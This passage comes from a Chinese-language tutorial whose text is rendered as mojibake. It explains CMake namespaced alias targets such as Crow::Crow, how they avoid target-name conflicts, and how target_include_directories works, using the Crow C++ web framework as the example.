add_subdirectory(third_party/Crow)  # å­é¡¹ç›®ä¹Ÿåˆ›å»ºäº† Crow
</code></pre>
<p>å¦‚æœå­é¡¹ç›®çš„ <code>CMakeLists.txt</code> ä¹Ÿåˆ›å»ºäº† <code>Crow</code> ç›®æ ‡ï¼Œä¼šå†²çªï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span>: add_library cannot create target <span class="hljs-string">"Crow"</span> because another
target <span class="hljs-keyword">with</span> the same name already exists.
</code></pre>
<p><strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦å‘½åç©ºé—´ï¼</strong></p>
<p>ä½¿ç”¨å‘½åç©ºé—´å¯ä»¥é¿å…å†²çªï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä¸»é¡¹ç›®
add_library(MyCrow INTERFACE)
add_library(MyCrow::MyCrow ALIAS MyCrow)

# å­é¡¹ç›®ï¼ˆç¬¬ä¸‰æ–¹ Crowï¼‰
add_subdirectory(third_party/Crow)  # å†…éƒ¨åˆ›å»º Crow å’Œåˆ«åCrow::Crow

# ç°åœ¨å¯ä»¥åŒæ—¶ä½¿ç”¨ï¼Œä¸ä¼šå†²çªï¼
target_link_libraries(myapp 
    MyCrow::MyCrow    # âœ… ä¸»é¡¹ç›®çš„ Crow
    Crow::Crow        # âœ… ç¬¬ä¸‰æ–¹ Crow
)
</code></pre>
<p><strong>å‘½åç©ºé—´å¦‚ä½•é¿å…å†²çªï¼Ÿ</strong></p>
<p>å‘½åç©ºé—´å‰ç¼€è®©ç›®æ ‡åå˜å¾—å”¯ä¸€ï¼š</p>



































<table><thead><tr><th>åœºæ™¯</th><th>è£¸åå­—</th><th>å‘½åç©ºé—´ç‰ˆæœ¬</th><th>æ˜¯å¦å†²çªï¼Ÿ</th></tr></thead><tbody><tr><td>åŒä¸€ä¸ªé¡¹ç›®</td><td><code>Crow</code></td><td><code>Crow::Crow</code></td><td>âœ… ä¸å†²çªï¼ˆä¸åŒåå­—ï¼‰</td></tr><tr><td>ä¸åŒé¡¹ç›®</td><td><code>Crow</code></td><td><code>Crow::Crow</code></td><td>âœ… ä¸å†²çªï¼ˆä¸åŒåå­—ï¼‰</td></tr><tr><td>ä¸¤ä¸ª <code>Crow</code></td><td><code>Crow</code> vs <code>Crow</code></td><td>-</td><td>âŒ å†²çªï¼</td></tr><tr><td>ä¸¤ä¸ªå‘½åç©ºé—´</td><td><code>Crow::Crow</code> vs <code>MyCrow::Crow</code></td><td>-</td><td>âœ… ä¸å†²çªï¼ˆä¸åŒåå­—ï¼‰</td></tr></tbody></table>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>å‡è®¾ä½ çš„é¡¹ç›®åŒæ—¶ä½¿ç”¨ä¸¤ä¸ªå­ç›®å½•çš„åº“ï¼Œå®ƒä»¬å†…éƒ¨éƒ½åˆ›å»ºäº† <code>Crow</code> ç›®æ ‡ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½ çš„é¡¹ç›®
add_subdirectory(libA)  # libA å†…éƒ¨ï¼šadd_library(Crow INTERFACE)
add_subdirectory(libB)  # libB å†…éƒ¨ï¼šadd_library(Crow INTERFACE)
# âŒ å†²çªï¼ä¸¤ä¸ª Crow ç›®æ ‡
</code></pre>
<p>ä½†å¦‚æœå®ƒä»¬éƒ½ä½¿ç”¨å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½ çš„é¡¹ç›®
add_subdirectory(libA)  # libA: add_library(Crow INTERFACE)
                        #      add_library(LibA::Crow ALIAS Crow)
add_subdirectory(libB)  # libB: add_library(Crow INTERFACE)
                        #      add_library(LibB::Crow ALIAS Crow)

# âœ… ä¸å†²çªï¼å› ä¸ºå‘½åç©ºé—´ä¸åŒ
target_link_libraries(myapp
    LibA::Crow   # âœ… æ¥è‡ª libA
    LibB::Crow   # âœ… æ¥è‡ª libB
)
</code></pre>
<p>è™½ç„¶å†…éƒ¨éƒ½æœ‰ <code>Crow</code> è£¸åå­—ç›®æ ‡ï¼Œä½†ï¼š</p>
<ul>
<li>å®ƒä»¬åœ¨ä¸åŒçš„ä½œç”¨åŸŸä¸­ï¼ˆä¸åŒçš„ <code>add_subdirectory</code>ï¼Œåœ¨å„è‡ªç›®å½•ä¸‹æ˜¯å”¯ä¸€çš„ï¼‰</li>
<li>é€šè¿‡å‘½åç©ºé—´åˆ«å <code>LibA::Crow</code> å’Œ <code>LibB::Crow</code> åŒºåˆ†</li>
<li>ä¸ä¼šå†²çª</li>
</ul>
<p><strong>ä½œç”¨åŸŸè§„åˆ™</strong>ï¼š</p>
<p>CMake çš„ç›®æ ‡ä½œç”¨åŸŸï¼š</p>
<ul>
<li>åœ¨åŒä¸€ä¸ª <code>add_subdirectory</code> ä½œç”¨åŸŸå†…ï¼Œç›®æ ‡åå¿…é¡»å”¯ä¸€</li>
<li>ä¸åŒä½œç”¨åŸŸå¯ä»¥æœ‰åŒåç›®æ ‡ï¼ˆä½†é€šè¿‡å‘½åç©ºé—´åŒºåˆ†æ›´æ¸…æ™°ï¼‰</li>
<li>å…¨å±€ä½œç”¨åŸŸï¼ˆæ ¹ CMakeLists.txtï¼‰çš„ç›®æ ‡åœ¨æ•´ä¸ªé¡¹ç›®å¯è§</li>
</ul>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ€»æ˜¯ä½¿ç”¨å‘½åç©ºé—´åˆ«å</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)  # âœ… æä¾›å‘½åç©ºé—´ç‰ˆæœ¬
</code></pre>
</li>
<li>
<p><strong>å¯¹å¤–æ¥å£ä½¿ç”¨å‘½åç©ºé—´</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># å¯¹å¤–æä¾›å‘½åç©ºé—´ç‰ˆæœ¬
target_link_libraries(public_api Crow::Crow)  # âœ… æ¸…æ™°ã€ä¸å†²çª
</code></pre>
</li>
<li>
<p><strong>å†…éƒ¨å¯ä»¥ä½¿ç”¨è£¸åå­—</strong>ï¼ˆå¦‚æœç¡®å®šä¸ä¼šå†²çªï¼‰ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># å†…éƒ¨ä½¿ç”¨ï¼ˆå¦‚æœç¡®å®šå”¯ä¸€ï¼‰
target_link_libraries(internal_lib Crow)  # âš ï¸ è°¨æ…ä½¿ç”¨
</code></pre>
</li>
</ol>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>âœ… <strong>ä¼šå†²çª</strong>ï¼šåŒä¸€ä¸ªä½œç”¨åŸŸå†…ä¸¤ä¸ªåŒåè£¸åå­—ç›®æ ‡ä¼šå†²çª</li>
<li>âœ… <strong>å‘½åç©ºé—´é¿å…å†²çª</strong>ï¼š<code>Crow::Crow</code> å’Œ <code>MyCrow::Crow</code> æ˜¯ä¸åŒçš„åå­—ï¼Œä¸å†²çª</li>
<li>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šæ€»æ˜¯åˆ›å»ºå‘½åç©ºé—´åˆ«åï¼Œå¯¹å¤–ä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬</li>
<li>âš ï¸ <strong>æ³¨æ„</strong>ï¼šå³ä½¿åœ¨ä¸åŒä½œç”¨åŸŸï¼Œä½¿ç”¨å‘½åç©ºé—´ä¹Ÿæ›´æ¸…æ™°ã€æ›´å®‰å…¨</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨ <code>Crow::Crow</code> å‘½åç©ºé—´æ ¼å¼ï¼Ÿ</strong></p>
<p>a. <strong>CMake æœ€ä½³å®è·µ</strong>ï¼š</p>
<ul>
<li>ç°ä»£ CMake æ¨èä½¿ç”¨ <code>å‘½åç©ºé—´::ç›®æ ‡å</code> çš„æ ¼å¼</li>
<li>è¿™æ˜¯ CMake 3.x å¼•å…¥çš„å‘½åç©ºé—´çº¦å®š</li>
<li>è®¸å¤šç¬¬ä¸‰æ–¹åº“éƒ½éµå¾ªè¿™ä¸ªçº¦å®šï¼ˆå¦‚ <code>asio::asio</code>ã€<code>OpenSSL::SSL</code>ã€<code>Boost::system</code>ï¼‰</li>
</ul>
<p>b. <strong>å®‰è£…å…¼å®¹æ€§</strong>ï¼š</p>
<ul>
<li>å½“é¡¹ç›®å®‰è£…åï¼Œé€šè¿‡ <code>find_package(Crow)</code> å¯¼å…¥æ—¶ï¼Œé€šå¸¸ä¼šæä¾›å‘½åç©ºé—´ç›®æ ‡</li>
<li>ä½¿ç”¨å‘½åç©ºé—´æ ¼å¼å¯ä»¥ä¿æŒæ„å»ºæ—¶å’Œå®‰è£…åçš„ä¸€è‡´æ€§</li>
<li>ç”¨æˆ·ä»£ç å¯ä»¥ç»Ÿä¸€ä½¿ç”¨ <code>Crow::Crow</code>ï¼Œæ— éœ€åŒºåˆ†æ˜¯æ„å»ºæ—¶è¿˜æ˜¯å®‰è£…å</li>
</ul>
<p>c. <strong>é¿å…åç§°å†²çª</strong>ï¼š</p>
<ul>
<li>å‘½åç©ºé—´å¯ä»¥é¿å…ä¸å…¶ä»–é¡¹ç›®çš„ç›®æ ‡åç§°å†²çª</li>
<li>ä¾‹å¦‚ï¼Œå¦‚æœæœ‰å¦ä¸€ä¸ªåº“ä¹Ÿå« <code>Crow</code>ï¼Œä½¿ç”¨ <code>Crow::Crow</code> å¯ä»¥æ˜ç¡®åŒºåˆ†</li>
</ul>
<p>d. <strong>ä»£ç å¯è¯»æ€§</strong>ï¼š</p>
<ul>
<li><code>Crow::Crow</code> æ˜ç¡®è¡¨ç¤ºè¿™æ˜¯ Crow é¡¹ç›®çš„ Crow åº“</li>
<li>æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§</li>
</ul>
<p><strong>å®é™…ä½¿ç”¨ç¤ºä¾‹å’Œå¥½å¤„å¯¹æ¯”</strong>ï¼š</p>
<p><strong>ç¤ºä¾‹ 1ï¼šä»£ç ä¸€è‡´æ€§ - æ„å»ºæ—¶ vs å®‰è£…å</strong></p>
<p>åœºæ™¯ï¼šä½ çš„é¡¹ç›®å¯èƒ½æœ‰ä¸¤ç§ä½¿ç”¨ Crow çš„æ–¹å¼</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ–¹å¼ Aï¼šä½œä¸ºå­é¡¹ç›®ï¼ˆæ„å»ºæ—¶ï¼‰
add_subdirectory(third_party/Crow)
target_link_libraries(myapp Crow::Crow)  # âœ… ä½¿ç”¨å‘½åç©ºé—´

# æ–¹å¼ Bï¼šé€šè¿‡ find_packageï¼ˆå®‰è£…åï¼‰
find_package(Crow REQUIRED)
target_link_libraries(myapp Crow::Crow)  # âœ… åŒæ ·çš„å†™æ³•ï¼
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šæ— è®º Crow æ˜¯ä½œä¸ºå­é¡¹ç›®è¿˜æ˜¯å·²å®‰è£…çš„åŒ…ï¼Œä»£ç å†™æ³•å®Œå…¨ä¸€è‡´ï¼</p>
<p><strong>ç¤ºä¾‹ 2ï¼šé¿å…åç§°å†²çª</strong></p>
<p>å‡è®¾ä½ çš„é¡¹ç›®åŒæ—¶ä½¿ç”¨å¤šä¸ªåº“ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># é¡¹ç›®åŒæ—¶ä½¿ç”¨ Crow å’Œå¦ä¸€ä¸ªå« "Crow" çš„åº“ï¼ˆå‡è®¾ï¼‰
add_subdirectory(third_party/Crow)
add_subdirectory(third_party/OtherCrow)  # å¦ä¸€ä¸ªåº“ä¹Ÿå« Crow

# ä½¿ç”¨å‘½åç©ºé—´ - æ¸…æ™°æ˜ç¡®
target_link_libraries(myapp 
    Crow::Crow        # âœ… æ˜ç¡®æ˜¯ Crow é¡¹ç›®çš„åº“
    OtherCrow::Crow   # âœ… æ˜ç¡®æ˜¯ OtherCrow é¡¹ç›®çš„åº“
)

# ä¸ä½¿ç”¨å‘½åç©ºé—´ - å®¹æ˜“æ··æ·†
target_link_libraries(myapp 
    Crow    # âŒ è¿™æ˜¯å“ªä¸ª Crowï¼Ÿ
    Crow    # âŒ å†²çªï¼CMake ä¼šæŠ¥é”™
)
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šå‘½åç©ºé—´é¿å…äº†ç›®æ ‡åç§°å†²çªï¼Œä»£ç æ›´æ¸…æ™°ã€‚</p>
<p><strong>ç¤ºä¾‹ 3ï¼šä¸ç¬¬ä¸‰æ–¹åº“é£æ ¼ä¸€è‡´</strong></p>
<p>åœ¨ Crow é¡¹ç›®ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰ä¾èµ–åº“éƒ½ä½¿ç”¨å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt ä¸­çš„å®é™…ä»£ç 
target_link_libraries(Crow INTERFACE
    asio::asio        # âœ… Asio åº“ä½¿ç”¨å‘½åç©ºé—´
    ZLIB::ZLIB       # âœ… ZLib åº“ä½¿ç”¨å‘½åç©ºé—´
    OpenSSL::SSL     # âœ… OpenSSL åº“ä½¿ç”¨å‘½åç©ºé—´
)
</code></pre>
<p>åœ¨ examples ä¸­ï¼Œä¹Ÿä½¿ç”¨å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># examples/CMakeLists.txt ä¸­çš„å®é™…ä»£ç 
target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… é£æ ¼ä¸€è‡´
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šä»£ç é£æ ¼ç»Ÿä¸€ï¼Œç¬¦åˆç°ä»£ CMake æœ€ä½³å®è·µï¼Œæé«˜å¯è¯»æ€§ã€‚</p>
<p><strong>ç¤ºä¾‹ 4ï¼šIDE å’Œå·¥å…·æ”¯æŒæ›´å¥½</strong></p>
<p>ä½¿ç”¨å‘½åç©ºé—´çš„ç›®æ ‡ï¼ŒIDE å’Œ CMake å·¥å…·èƒ½æ›´å¥½åœ°è¯†åˆ«ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½¿ç”¨å‘½åç©ºé—´ - IDE å¯ä»¥è‡ªåŠ¨è¡¥å…¨å’Œæ£€æŸ¥
target_link_libraries(myapp Crow::Crow)  # âœ… IDE çŸ¥é“è¿™æ˜¯ Crow é¡¹ç›®çš„ç›®æ ‡

# ä¸ä½¿ç”¨å‘½åç©ºé—´ - å¯èƒ½ä¸å…¶ä»–ç›®æ ‡æ··æ·†
target_link_libraries(myapp Crow)  # âŒ å¯èƒ½æ˜¯ä»»ä½•å« Crow çš„ç›®æ ‡
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šæ›´å¥½çš„å¼€å‘ä½“éªŒï¼Œå·¥å…·æ”¯æŒæ›´å®Œå–„ã€‚</p>
<p><strong>ç¤ºä¾‹ 5ï¼šå®‰è£…é…ç½®æ–‡ä»¶ä¸­çš„ä½¿ç”¨</strong></p>
<p>æŸ¥çœ‹ <code>cmake/CrowConfig.cmake.in</code>ï¼ˆå®‰è£…é…ç½®æ–‡ä»¶ï¼‰ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ç¬¬ 28 è¡Œï¼šè·å– Crow::Crow çš„å±æ€§
get_target_property(_CROW_ILL Crow::Crow INTERFACE_LINK_LIBRARIES)
get_target_property(_CROW_ICD Crow::Crow INTERFACE_COMPILE_DEFINITIONS)

# ç¬¬ 52 è¡Œï¼šè®¾ç½® Crow::Crow çš„å±æ€§
set_target_properties(Crow::Crow PROPERTIES
    INTERFACE_COMPILE_DEFINITIONS "${_CROW_ICD}"
)
</code></pre>
<p>å®‰è£…åçš„åŒ…å¿…é¡»ä½¿ç”¨ <code>Crow::Crow</code>ï¼Œå¦‚æœæ„å»ºæ—¶ä¸ä½¿ç”¨å‘½åç©ºé—´ï¼Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>æ„å»ºæ—¶ç”¨ <code>Crow</code></li>
<li>å®‰è£…åç”¨ <code>Crow::Crow</code></li>
<li>ä»£ç ä¸ä¸€è‡´ï¼Œå®¹æ˜“å‡ºé”™</li>
</ul>
<p><strong>å¥½å¤„</strong>ï¼šæ„å»ºæ—¶å’Œå®‰è£…åä½¿ç”¨ç›¸åŒçš„ç›®æ ‡åç§°ï¼Œé¿å…æ··æ·†ã€‚</p>
<p><strong>æ€»ç»“å¯¹æ¯”è¡¨</strong>ï¼š</p>













































<table><thead><tr><th>ç‰¹æ€§</th><th>ä½¿ç”¨ <code>Crow::Crow</code></th><th>ä½¿ç”¨ <code>Crow</code></th></tr></thead><tbody><tr><td>æ„å»ºæ—¶å¯ç”¨</td><td>âœ… æ˜¯</td><td>âœ… æ˜¯</td></tr><tr><td>å®‰è£…åå¯ç”¨</td><td>âœ… æ˜¯</td><td>âŒ å¯èƒ½ä¸è¡Œ</td></tr><tr><td>é¿å…åç§°å†²çª</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>ä»£ç ä¸€è‡´æ€§</td><td>âœ… é«˜</td><td>âŒ ä½</td></tr><tr><td>ç¬¦åˆç°ä»£ CMake</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>IDE æ”¯æŒ</td><td>âœ… æ›´å¥½</td><td>âš ï¸ ä¸€èˆ¬</td></tr><tr><td>ä¸ç¬¬ä¸‰æ–¹åº“é£æ ¼ä¸€è‡´</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr></tbody></table>
<p><strong>é‡è¦æ¾„æ¸…ï¼šCMake å‘½åç©ºé—´ vs C++ å‘½åç©ºé—´</strong></p>
<p>âš ï¸ <strong>å…³é”®åŒºåˆ«</strong>ï¼šCMake çš„ <code>Crow::Crow</code> å‘½åç©ºé—´å’Œ C++ ä»£ç ä¸­çš„å‘½åç©ºé—´æ˜¯<strong>å®Œå…¨ç‹¬ç«‹</strong>çš„ï¼Œäº’ä¸å½±å“ï¼</p>
<p><strong>CMake å‘½åç©ºé—´</strong>ï¼ˆåªåœ¨ CMakeLists.txt ä¸­ä½¿ç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt ä¸­
add_library(Crow::Crow ALIAS Crow)  # CMake ç›®æ ‡åç§°
target_link_libraries(myapp Crow::Crow)  # é“¾æ¥æ—¶ä½¿ç”¨
</code></pre>
<p><strong>C++ å‘½åç©ºé—´</strong>ï¼ˆåœ¨ C++ æºä»£ç ä¸­ä½¿ç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++ æºä»£ç ä¸­</span>
<span class="hljs-keyword">namespace</span> crow {  <span class="hljs-comment">// C++ å‘½åç©ºé—´ï¼ˆå°å†™ï¼‰</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> { ... };
}

<span class="hljs-comment">// ä½¿ç”¨æ—¶</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span></span>
crow::App app;  <span class="hljs-comment">// âœ… ä½¿ç”¨ C++ å‘½åç©ºé—´ crowï¼ˆå°å†™ï¼‰</span>
</code></pre>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>æŸ¥çœ‹ <code>examples/example.cpp</code> çš„å®é™…ä»£ç ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    crow::App&lt;ExampleMiddleware&gt; app;  <span class="hljs-comment">// âœ… C++ å‘½åç©ºé—´ï¼šcrowï¼ˆå°å†™ï¼‰</span>
    crow::json::wvalue x;              <span class="hljs-comment">// âœ… C++ å‘½åç©ºé—´ï¼šcrowï¼ˆå°å†™ï¼‰</span>
    crow::request req;                 <span class="hljs-comment">// âœ… C++ å‘½åç©ºé—´ï¼šcrowï¼ˆå°å†™ï¼‰</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>è€Œåœ¨ <code>examples/CMakeLists.txt</code> ä¸­ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… CMake å‘½åç©ºé—´ï¼šCrow::Crowï¼ˆå¤§å†™ï¼‰
</code></pre>
<p><strong>ä¸¤è€…å¯¹æ¯”</strong>ï¼š</p>



































<table><thead><tr><th>å±‚é¢</th><th>CMake å‘½åç©ºé—´</th><th>C++ å‘½åç©ºé—´</th></tr></thead><tbody><tr><td>ä½¿ç”¨ä½ç½®</td><td>CMakeLists.txt</td><td>.cpp/.h æºä»£ç </td></tr><tr><td>æ ¼å¼</td><td><code>Crow::Crow</code>ï¼ˆå¤§å†™ï¼‰</td><td><code>crow</code>ï¼ˆå°å†™ï¼‰</td></tr><tr><td>ä½œç”¨</td><td>æ„å»ºç³»ç»Ÿç›®æ ‡æ ‡è¯†</td><td>ä»£ç ç»„ç»‡ã€é¿å…ç¬¦å·å†²çª</td></tr><tr><td>å½±å“èŒƒå›´</td><td>æ„å»ºé…ç½®</td><td>ç¼–è¯‘åçš„ä»£ç </td></tr><tr><td>æ˜¯å¦ç›¸å…³</td><td>âŒ å®Œå…¨ç‹¬ç«‹</td><td>âŒ å®Œå…¨ç‹¬ç«‹</td></tr></tbody></table>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>CMake çš„ <code>Crow::Crow</code> åªå½±å“æ„å»ºç³»ç»Ÿï¼Œä¸å½±å“ C++ ä»£ç </li>
<li>C++ ä»£ç ä¸­çš„ <code>namespace crow</code> æ˜¯åº“çš„ç¼–ç¨‹æ¥å£ï¼Œä¸ CMake æ— å…³</li>
<li>ä½ å¯ä»¥ä½¿ç”¨ <code>Crow::Crow</code>ï¼ˆCMakeï¼‰é“¾æ¥åº“ï¼Œç„¶ååœ¨ä»£ç ä¸­ä½¿ç”¨ <code>crow::App</code>ï¼ˆC++ï¼‰</li>
<li>ä¸¤è€…å¯ä»¥æœ‰ä¸åŒçš„å‘½åé£æ ¼ï¼Œäº’ä¸å¹²æ‰°</li>
</ul>
</li>
<li>
<p><strong>åŒ…å«ç›®å½•è¯¦è§£</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong><code>target_include_directories</code> çš„æœ¬è´¨</strong>ï¼š</p>
<p><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼šå‘Šè¯‰ç¼–è¯‘å™¨åœ¨å“ªé‡Œæ‰¾å¤´æ–‡ä»¶</p>
<p><code>target_include_directories</code> çš„æœ¬è´¨æ˜¯<strong>è®¾ç½®ç¼–è¯‘å™¨çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„</strong>ã€‚å®ƒä¼šåœ¨ç¼–è¯‘æ—¶è½¬æ¢ä¸ºç¼–è¯‘å™¨çš„ <code>-I</code> é€‰é¡¹ï¼ˆGCC/Clangï¼‰æˆ– <code>/I</code> é€‰é¡¹ï¼ˆMSVCï¼‰ã€‚</p>
<p><strong>ä» CMake åˆ°ç¼–è¯‘å™¨çš„è½¬æ¢</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
target_include_directories(Crow INTERFACE include/)
</code></pre>
<p>è½¬æ¢ä¸ºå®é™…çš„ç¼–è¯‘å™¨å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GCC/Clang</span>
g++ -I/path/to/include -c example.cpp

<span class="hljs-comment"># MSVC</span>
cl.exe /I<span class="hljs-string">"C:\path\to\include"</span> example.cpp
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªï¼Ÿ</strong></p>
<p>å½“ä½ çš„ä»£ç å†™ <code>#include "crow.h"</code> æ—¶ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span>  <span class="hljs-comment">// ç¼–è¯‘å™¨éœ€è¦çŸ¥é“åœ¨å“ªé‡Œæ‰¾è¿™ä¸ªæ–‡ä»¶</span></span>
</code></pre>
<p>ç¼–è¯‘å™¨ä¼šï¼š</p>
<ol>
<li>å…ˆåœ¨å½“å‰ç›®å½•æŸ¥æ‰¾ <code>crow.h</code></li>
<li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåœ¨ <code>target_include_directories</code> æŒ‡å®šçš„è·¯å¾„ä¸­æŸ¥æ‰¾</li>
<li>å¦‚æœè¿˜æ‰¾ä¸åˆ°ï¼ŒæŠ¥é”™ï¼š<code>fatal error: 'crow.h' file not found</code></li>
</ol>
<p><strong>INTERFACEã€PUBLICã€PRIVATE çš„åŒºåˆ«</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># å‡è®¾æœ‰ä¸€ä¸ªåº“ MyLib
add_library(MyLib STATIC mylib.cpp)

# PRIVATEï¼šåªç»™è‡ªå·±ç”¨ï¼Œä¸ä¼ æ’­ç»™ä¾èµ–è€…
target_include_directories(MyLib PRIVATE 
    ${CMAKE_CURRENT_SOURCE_DIR}/private_headers  # åªæœ‰ MyLib è‡ªå·±ç”¨
)

# INTERFACEï¼šåªç»™ä¾èµ–è€…ç”¨ï¼Œè‡ªå·±ä¸ç”¨
target_include_directories(MyLib INTERFACE 
    ${CMAKE_CURRENT_SOURCE_DIR}/public_headers   # ä¾èµ– MyLib çš„ç›®æ ‡å¯ä»¥ç”¨
)

# PUBLICï¼šæ—¢ç»™è‡ªå·±ç”¨ï¼Œä¹Ÿä¼ æ’­ç»™ä¾èµ–è€…
target_include_directories(MyLib PUBLIC 
    ${CMAKE_CURRENT_SOURCE_DIR}/headers          # MyLib å’Œä¾èµ–è€…éƒ½èƒ½ç”¨
)
</code></pre>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># MyLib çš„ CMakeLists.txt
add_library(MyLib STATIC mylib.cpp)
target_include_directories(MyLib PUBLIC include/)  # PUBLICï¼šä¼ æ’­ç»™ä½¿ç”¨è€…

# ä½ çš„é¡¹ç›®çš„ CMakeLists.txt
add_executable(myapp main.cpp)
target_link_libraries(myapp MyLib)  # é“¾æ¥ MyLib

# ç¼–è¯‘ myapp æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ·»åŠ  -I/path/to/MyLib/include
# æ‰€ä»¥ main.cpp å¯ä»¥å†™ï¼š
# #include "mylib.h"  // âœ… èƒ½æ‰¾åˆ°ï¼Œå› ä¸º MyLib çš„ PUBLIC include è·¯å¾„è¢«ä¼ æ’­äº†
</code></pre>
<p><strong>Crow é¡¹ç›®ä¸­çš„å®é™…ä½¿ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong>è§£æ</strong>ï¼š</p>
<ol>
<li><strong><code>INTERFACE</code></strong>ï¼š
<ul>
<li>Crow æ˜¯ header-only åº“ï¼Œæ²¡æœ‰è‡ªå·±çš„æºæ–‡ä»¶éœ€è¦ç¼–è¯‘</li>
<li>æ‰€ä»¥ç”¨ <code>INTERFACE</code>ï¼Œåªç»™ä½¿ç”¨è€…æä¾›å¤´æ–‡ä»¶è·¯å¾„</li>
</ul>
</li>
<li><strong><code>$&lt;BUILD_INTERFACE:...&gt;</code></strong>ï¼š
<ul>
<li>è¿™æ˜¯ CMake çš„ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼ˆGenerator Expressionï¼‰</li>
<li>æ„å»ºæ—¶ï¼ˆ<code>cmake --build</code>ï¼‰ä½¿ç”¨ï¼š<code>${CMAKE_CURRENT_SOURCE_DIR}/include</code></li>
<li>å³ï¼š<code>C:\Users\notfr\projects\Crow\include</code></li>
</ul>
</li>
<li><strong><code>$&lt;INSTALL_INTERFACE:...&gt;</code></strong>ï¼š
<ul>
<li>å®‰è£…åï¼ˆ<code>cmake --install</code>ï¼‰ä½¿ç”¨ï¼š<code>include</code></li>
<li>å³ï¼šå®‰è£…ç›®å½•ä¸‹çš„ <code>include</code> æ–‡ä»¶å¤¹</li>
<li>ä¾‹å¦‚ï¼š<code>C:\Program Files\Crow\include</code></li>
</ul>
</li>
</ol>
<p><strong>å®é™…æ•ˆæœ</strong>ï¼š</p>
<p>å½“ä½ åœ¨ä»£ç ä¸­å†™ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span>  <span class="hljs-comment">// æˆ– #include &lt;crow.h&gt;</span></span>
</code></pre>
<p>ç¼–è¯‘å™¨ä¼šï¼š</p>
<ol>
<li>æ„å»ºæ—¶ï¼šåœ¨ <code>C:\Users\notfr\projects\Crow\include</code> ä¸­æŸ¥æ‰¾</li>
<li>å®‰è£…åï¼šåœ¨ <code>C:\Program Files\Crow\include</code> ä¸­æŸ¥æ‰¾</li>
</ol>
